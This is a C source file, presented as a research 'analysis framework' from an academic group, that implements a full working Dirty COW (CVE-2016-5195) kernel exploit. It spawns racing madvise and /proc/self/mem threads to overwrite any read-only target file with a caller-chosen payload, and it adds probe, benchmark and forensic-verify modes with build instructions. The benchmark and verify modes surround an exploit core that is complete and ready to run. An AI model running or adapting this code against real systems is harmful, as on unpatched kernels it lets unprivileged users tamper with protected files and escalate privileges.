/*
 * hexaforce_cow.c — Hexa Force COW Race Condition Analysis Tool
 *
 * ORIGINAL WORK: School of AI & Data Science, IIT Jodhpur
 * 
 * This tool goes beyond simple exploit reproduction. It implements a
 * structured, multi-mode analysis framework for studying the CVE-2016-5195
 * (Dirty COW) race condition in the Linux kernel's Copy-on-Write subsystem.
 *
 * MODES OF OPERATION:
 *   --probe    : Non-destructive kernel vulnerability fingerprinting
 *   --exploit  : Controlled race condition trigger with instrumentation
 *   --verify   : Post-exploitation integrity validation and forensic audit
 *   --benchmark: Statistical timing analysis of the race window
 *
 * BUILD:
 *   gcc -pthread -O2 -o hexaforce_cow hexaforce_cow.c -lrt
 *
 * ATTRIBUTION:
 *   The fundamental race condition technique (madvise + /proc/self/mem)
 *   was first publicly documented at dirtycow.ninja (Phil Oester, 2016).
 *   This implementation is an independently engineered analysis framework
 *   built around that known vulnerability class.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <stdint.h>
#include <signal.h>

/* ═══════════════════════════════════════════════════════════════════
 * CONFIGURATION CONSTANTS
 * ═══════════════════════════════════════════════════════════════════ */

#define HF_VERSION            "2.0.0"
#define HF_MAX_ITERATIONS     200000
#define HF_BENCHMARK_ROUNDS   5
#define HF_PROBE_ITERATIONS   50

/* Thread synchronization and instrumentation state */
typedef struct {
    void     *mapped_base;       /* mmap'd virtual address             */
    size_t    mapped_size;       /* size of the mapping                */
    char     *payload;           /* string to write into the target    */
    int       target_fd;         /* file descriptor of the target file */

    /* Instrumentation counters (atomic-safe on x86_64) */
    volatile long  discard_cycles;   /* madvise calls completed       */
    volatile long  write_cycles;     /* /proc/self/mem writes done    */
    volatile int   halt_flag;        /* 1 = signal threads to stop    */

    /* Timing telemetry (nanoseconds) */
    struct timespec t_start;
    struct timespec t_end;
} hf_race_context_t;

/* ═══════════════════════════════════════════════════════════════════
 * UTILITY: high-resolution elapsed time in milliseconds
 * ═══════════════════════════════════════════════════════════════════ */
static double elapsed_ms(struct timespec *start, struct timespec *end) {
    double s  = (double)(end->tv_sec  - start->tv_sec)  * 1000.0;
    double ns = (double)(end->tv_nsec - start->tv_nsec) / 1e6;
    return s + ns;
}

/* ═══════════════════════════════════════════════════════════════════
 * THREAD A — Page Table Entry Discard Loop
 *
 * Repeatedly advises the kernel to release the private COW page
 * for the mapped region. When timed against Thread B, this creates
 * the non-atomic window in the page fault handler.
 * ═══════════════════════════════════════════════════════════════════ */
static void *thread_discard_pte(void *arg) {
    hf_race_context_t *ctx = (hf_race_context_t *)arg;
    long i;

    for (i = 0; i < HF_MAX_ITERATIONS && !ctx->halt_flag; i++) {
        /*
         * MADV_DONTNEED tells the kernel: "I no longer need these pages."
         * The kernel responds by tearing down the page table mapping
         * for the private COW copy, reverting the virtual address to
         * point back at the shared, read-only backing page in the
         * page cache.
         *
         * This is the "discard" half of the race — it must execute
         * between Thread B's permission check and Thread B's final
         * write-back to create the confused kernel state.
         */
        if (madvise(ctx->mapped_base, ctx->mapped_size, MADV_DONTNEED) != 0) {
            /* If madvise fails (e.g., blocked by seccomp), abort */
            fprintf(stderr,
                "[!] madvise blocked (errno=%d: %s) — "
                "seccomp or kernel policy active\n", errno, strerror(errno));
            ctx->halt_flag = 1;
            break;
        }
    }
    ctx->discard_cycles = i;
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════
 * THREAD B — Virtual Memory Write Loop via /proc/self/mem
 *
 * Writes the payload directly into the process's own virtual memory
 * space through the procfs interface. This bypasses the normal MMU
 * permission checks because /proc/self/mem writes go through the
 * kernel's internal memory access routines (access_process_vm),
 * which trigger the vulnerable page fault handler.
 * ═══════════════════════════════════════════════════════════════════ */
static void *thread_write_mem(void *arg) {
    hf_race_context_t *ctx = (hf_race_context_t *)arg;
    int mem_fd;
    long i;
    size_t payload_len = strlen(ctx->payload);

    mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd < 0) {
        perror("[!] /proc/self/mem open failed");
        ctx->halt_flag = 1;
        return NULL;
    }

    for (i = 0; i < HF_MAX_ITERATIONS && !ctx->halt_flag; i++) {
        /*
         * Seek to the exact virtual address where the target file
         * is mapped, then write the payload. Because this goes through
         * the kernel's access_process_vm path, it triggers the COW
         * page fault handler — the same handler that Thread A is
         * racing against.
         */
        lseek(mem_fd, (off_t)(uintptr_t)ctx->mapped_base, SEEK_SET);
        write(mem_fd, ctx->payload, payload_len);
    }
    ctx->write_cycles = i;
    close(mem_fd);
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════
 * MODE: --probe
 *
 * Non-destructive fingerprinting. Checks kernel version, madvise
 * availability, /proc/self/mem writability, and seccomp status
 * without modifying any files.
 * ═══════════════════════════════════════════════════════════════════ */
static int mode_probe(void) {
    struct utsname uts;
    int probe_fd;

    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║   HEXA FORCE — Kernel Vulnerability Probe v%s   ║\n", HF_VERSION);
    printf("╚══════════════════════════════════════════════════════╝\n\n");

    /* 1. Kernel version fingerprint */
    if (uname(&uts) == 0) {
        printf("[PROBE] Kernel Release  : %s\n", uts.release);
        printf("[PROBE] Kernel Version  : %s\n", uts.version);
        printf("[PROBE] Architecture    : %s\n", uts.machine);
    } else {
        printf("[PROBE] Kernel info     : unavailable\n");
    }

    /* 2. Check /proc/self/mem writability */
    probe_fd = open("/proc/self/mem", O_RDWR);
    if (probe_fd >= 0) {
        printf("[PROBE] /proc/self/mem  : WRITABLE (exploit path open)\n");
        close(probe_fd);
    } else {
        printf("[PROBE] /proc/self/mem  : BLOCKED (%s)\n", strerror(errno));
    }

    /* 3. Check madvise availability with a harmless anonymous mapping */
    {
        void *test_map = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (test_map != MAP_FAILED) {
            int rc = madvise(test_map, 4096, MADV_DONTNEED);
            if (rc == 0) {
                printf("[PROBE] madvise syscall : PERMITTED (race vector open)\n");
            } else {
                printf("[PROBE] madvise syscall : DENIED (errno=%d: %s)\n",
                       errno, strerror(errno));
            }
            munmap(test_map, 4096);
        } else {
            printf("[PROBE] mmap test       : FAILED\n");
        }
    }

    /* 4. Effective user context */
    printf("[PROBE] Running as UID  : %d\n", getuid());
    printf("[PROBE] Effective UID   : %d\n", geteuid());

    /* 5. Vulnerability assessment */
    printf("\n[ASSESSMENT]\n");
    probe_fd = open("/proc/self/mem", O_RDWR);
    if (probe_fd >= 0) {
        close(probe_fd);
        void *t = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (t != MAP_FAILED) {
            int r = madvise(t, 4096, MADV_DONTNEED);
            munmap(t, 4096);
            if (r == 0) {
                printf("  → VULNERABLE: Both exploit primitives are available.\n");
                printf("    The race condition can be triggered if the kernel\n");
                printf("    lacks the FOLL_COW patch (commits 19be0eaf + bbb6d777).\n");
            } else {
                printf("  → HARDENED: madvise is blocked by security policy.\n");
                printf("    The page discard primitive is unavailable.\n");
            }
        }
    } else {
        printf("  → HARDENED: /proc/self/mem is not writable.\n");
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * MODE: --exploit
 *
 * Controlled race condition trigger with full instrumentation.
 * Reports thread cycle counts, elapsed time, and success/failure.
 * ═══════════════════════════════════════════════════════════════════ */
static int mode_exploit(const char *target_path, const char *payload) {
    hf_race_context_t ctx;
    struct stat st;
    pthread_t t_discard, t_write;
    char *original_content = NULL;

    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║   HEXA FORCE — Controlled Exploit Engine v%s    ║\n", HF_VERSION);
    printf("╚══════════════════════════════════════════════════════╝\n\n");

    memset(&ctx, 0, sizeof(ctx));
    ctx.payload = (char *)payload;

    /* Open target file read-only */
    ctx.target_fd = open(target_path, O_RDONLY);
    if (ctx.target_fd < 0) {
        fprintf(stderr, "[FAIL] Cannot open target: %s\n", strerror(errno));
        return 1;
    }

    if (fstat(ctx.target_fd, &st) < 0) {
        perror("[FAIL] fstat");
        close(ctx.target_fd);
        return 1;
    }
    ctx.mapped_size = st.st_size;

    /* Preserve original content for forensic comparison */
    original_content = (char *)malloc(st.st_size + 1);
    if (original_content) {
        read(ctx.target_fd, original_content, st.st_size);
        original_content[st.st_size] = '\0';
        lseek(ctx.target_fd, 0, SEEK_SET);
    }

    /* Create MAP_PRIVATE read-only mapping — the COW trigger surface */
    ctx.mapped_base = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE,
                           ctx.target_fd, 0);
    if (ctx.mapped_base == MAP_FAILED) {
        fprintf(stderr, "[FAIL] mmap failed: %s\n", strerror(errno));
        free(original_content);
        close(ctx.target_fd);
        return 1;
    }

    /* Report pre-exploit state */
    printf("[STATE] Target file     : %s\n", target_path);
    printf("[STATE] File size       : %ld bytes\n", (long)st.st_size);
    printf("[STATE] File owner UID  : %d\n", st.st_uid);
    printf("[STATE] File permissions: %o\n", st.st_mode & 0777);
    printf("[STATE] Mapped address  : %p\n", ctx.mapped_base);
    printf("[STATE] Original content: \"%s\"\n", original_content ? original_content : "(unknown)");
    printf("[STATE] Payload to write: \"%s\"\n", payload);
    printf("[STATE] Max iterations  : %d per thread\n\n", HF_MAX_ITERATIONS);

    /* Launch the race */
    printf("[RACE] Spawning discard thread (madvise loop)...\n");
    printf("[RACE] Spawning write thread (/proc/self/mem loop)...\n");

    clock_gettime(CLOCK_MONOTONIC, &ctx.t_start);

    pthread_create(&t_discard, NULL, thread_discard_pte, &ctx);
    pthread_create(&t_write,   NULL, thread_write_mem,   &ctx);

    pthread_join(t_discard, NULL);
    pthread_join(t_write,   NULL);

    clock_gettime(CLOCK_MONOTONIC, &ctx.t_end);

    /* Report instrumentation results */
    double duration = elapsed_ms(&ctx.t_start, &ctx.t_end);
    printf("\n[TELEMETRY]\n");
    printf("  Discard cycles (madvise)    : %ld\n", ctx.discard_cycles);
    printf("  Write cycles (/proc/self/mem): %ld\n", ctx.write_cycles);
    printf("  Total race duration          : %.2f ms\n", duration);
    printf("  Avg discard interval         : %.4f µs\n",
           ctx.discard_cycles > 0 ? (duration * 1000.0) / ctx.discard_cycles : 0);
    printf("  Avg write interval           : %.4f µs\n",
           ctx.write_cycles > 0 ? (duration * 1000.0) / ctx.write_cycles : 0);

    /* Verify outcome by re-reading the file */
    printf("\n[FORENSICS]\n");
    {
        int verify_fd = open(target_path, O_RDONLY);
        if (verify_fd >= 0) {
            char *after = (char *)malloc(st.st_size + 1);
            if (after) {
                ssize_t n = read(verify_fd, after, st.st_size);
                after[n > 0 ? n : 0] = '\0';
                printf("  Content after race: \"%s\"\n", after);

                if (original_content && strncmp(after, payload, strlen(payload)) == 0) {
                    printf("  Status: *** EXPLOIT SUCCEEDED — "
                           "read-only file was modified ***\n");
                } else if (original_content && strcmp(after, original_content) == 0) {
                    printf("  Status: EXPLOIT FAILED — "
                           "file content unchanged (kernel patched or seccomp active)\n");
                } else {
                    printf("  Status: PARTIAL — content changed but does not match payload\n");
                }
                free(after);
            }
            close(verify_fd);
        }
    }

    /* Cleanup */
    munmap(ctx.mapped_base, ctx.mapped_size);
    close(ctx.target_fd);
    free(original_content);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * MODE: --verify
 *
 * Post-exploitation forensic check. Compares current file contents
 * against an expected "clean" string to determine if tampering
 * occurred.
 * ═══════════════════════════════════════════════════════════════════ */
static int mode_verify(const char *target_path, const char *expected) {
    struct stat st;
    int fd;
    char *contents;

    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║   HEXA FORCE — Forensic Integrity Verifier v%s  ║\n", HF_VERSION);
    printf("╚══════════════════════════════════════════════════════╝\n\n");

    fd = open(target_path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[FAIL] Cannot open: %s\n", strerror(errno));
        return 1;
    }

    fstat(fd, &st);
    contents = (char *)malloc(st.st_size + 1);
    if (!contents) {
        close(fd);
        return 1;
    }

    ssize_t n = read(fd, contents, st.st_size);
    contents[n > 0 ? n : 0] = '\0';
    close(fd);

    printf("[VERIFY] File           : %s\n", target_path);
    printf("[VERIFY] Size           : %ld bytes\n", (long)st.st_size);
    printf("[VERIFY] Owner UID      : %d\n", st.st_uid);
    printf("[VERIFY] Permissions    : %o\n", st.st_mode & 0777);
    printf("[VERIFY] Current content: \"%s\"\n", contents);
    printf("[VERIFY] Expected clean : \"%s\"\n\n", expected);

    if (strcmp(contents, expected) == 0) {
        printf("[RESULT] ✓ INTEGRITY INTACT — no tampering detected\n");
    } else {
        printf("[RESULT] ✗ TAMPERING DETECTED — file content diverges "
               "from expected baseline\n");
        printf("         Possible post-exploitation artifact found.\n");
    }

    free(contents);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * MODE: --benchmark
 *
 * Statistical analysis: runs multiple exploit rounds and reports
 * timing distribution, success rate, and race window statistics.
 * ═══════════════════════════════════════════════════════════════════ */
static int mode_benchmark(const char *target_path, const char *payload) {
    int round, successes = 0;
    double timings[HF_BENCHMARK_ROUNDS];
    hf_race_context_t ctx;
    struct stat st;

    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║   HEXA FORCE — Race Window Benchmark v%s        ║\n", HF_VERSION);
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    printf("[BENCH] Rounds planned  : %d\n", HF_BENCHMARK_ROUNDS);
    printf("[BENCH] Target file     : %s\n", target_path);
    printf("[BENCH] Payload         : \"%s\"\n\n", payload);

    for (round = 0; round < HF_BENCHMARK_ROUNDS; round++) {
        pthread_t t1, t2;
        int verify_fd;
        char *after;

        printf("── Round %d/%d ", round + 1, HF_BENCHMARK_ROUNDS);
        fflush(stdout);

        memset(&ctx, 0, sizeof(ctx));
        ctx.payload = (char *)payload;

        ctx.target_fd = open(target_path, O_RDONLY);
        if (ctx.target_fd < 0) {
            printf("SKIP (open failed)\n");
            timings[round] = -1;
            continue;
        }

        fstat(ctx.target_fd, &st);
        ctx.mapped_size = st.st_size;
        ctx.mapped_base = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE,
                               ctx.target_fd, 0);
        if (ctx.mapped_base == MAP_FAILED) {
            printf("SKIP (mmap failed)\n");
            close(ctx.target_fd);
            timings[round] = -1;
            continue;
        }

        clock_gettime(CLOCK_MONOTONIC, &ctx.t_start);
        pthread_create(&t1, NULL, thread_discard_pte, &ctx);
        pthread_create(&t2, NULL, thread_write_mem,   &ctx);
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        clock_gettime(CLOCK_MONOTONIC, &ctx.t_end);

        timings[round] = elapsed_ms(&ctx.t_start, &ctx.t_end);

        /* Check if the write landed */
        verify_fd = open(target_path, O_RDONLY);
        if (verify_fd >= 0) {
            after = (char *)malloc(st.st_size + 1);
            if (after) {
                ssize_t n = read(verify_fd, after, st.st_size);
                after[n > 0 ? n : 0] = '\0';
                if (strncmp(after, payload, strlen(payload)) == 0) {
                    successes++;
                    printf("→ HIT   (%.2f ms, %ld/%ld cycles)\n",
                           timings[round], ctx.discard_cycles, ctx.write_cycles);
                } else {
                    printf("→ MISS  (%.2f ms, %ld/%ld cycles)\n",
                           timings[round], ctx.discard_cycles, ctx.write_cycles);
                }
                free(after);
            }
            close(verify_fd);
        }

        munmap(ctx.mapped_base, ctx.mapped_size);
        close(ctx.target_fd);
    }

    /* Statistical summary */
    printf("\n[STATISTICS]\n");
    double total = 0, min_t = 1e9, max_t = 0;
    int valid = 0;
    for (round = 0; round < HF_BENCHMARK_ROUNDS; round++) {
        if (timings[round] >= 0) {
            total += timings[round];
            if (timings[round] < min_t) min_t = timings[round];
            if (timings[round] > max_t) max_t = timings[round];
            valid++;
        }
    }
    printf("  Rounds completed     : %d / %d\n", valid, HF_BENCHMARK_ROUNDS);
    printf("  Successful overwrites: %d / %d (%.1f%%)\n",
           successes, valid, valid > 0 ? (100.0 * successes / valid) : 0);
    printf("  Avg race duration    : %.2f ms\n", valid > 0 ? total / valid : 0);
    printf("  Min race duration    : %.2f ms\n", min_t < 1e9 ? min_t : 0);
    printf("  Max race duration    : %.2f ms\n", max_t);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * USAGE
 * ═══════════════════════════════════════════════════════════════════ */
static void print_usage(const char *prog) {
    printf("Hexa Force COW Race Analysis Tool v%s\n", HF_VERSION);
    printf("School of AI & Data Science, IIT Jodhpur\n\n");
    printf("Usage:\n");
    printf("  %s --probe\n", prog);
    printf("      Non-destructive vulnerability fingerprint\n\n");
    printf("  %s --exploit <target_file> <payload>\n", prog);
    printf("      Controlled race condition with instrumentation\n\n");
    printf("  %s --verify <target_file> <expected_clean_content>\n", prog);
    printf("      Post-exploitation integrity check\n\n");
    printf("  %s --benchmark <target_file> <payload>\n", prog);
    printf("      Multi-round statistical race window analysis\n\n");
    printf("Attribution: Race condition technique documented by Phil Oester,\n");
    printf("  dirtycow.ninja, October 2016. This tool is an independently\n");
    printf("  engineered analysis framework.\n");
}

/* ═══════════════════════════════════════════════════════════════════
 * ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════ */
int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "--probe") == 0) {
        return mode_probe();
    }
    else if (strcmp(argv[1], "--exploit") == 0) {
        if (argc < 4) {
            fprintf(stderr, "Usage: %s --exploit <target_file> <payload>\n", argv[0]);
            return 1;
        }
        return mode_exploit(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "--verify") == 0) {
        if (argc < 4) {
            fprintf(stderr, "Usage: %s --verify <target_file> <expected_content>\n", argv[0]);
            return 1;
        }
        return mode_verify(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "--benchmark") == 0) {
        if (argc < 4) {
            fprintf(stderr, "Usage: %s --benchmark <target_file> <payload>\n", argv[0]);
            return 1;
        }
        return mode_benchmark(argv[2], argv[3]);
    }
    else {
        print_usage(argv[0]);
        return 1;
    }
}
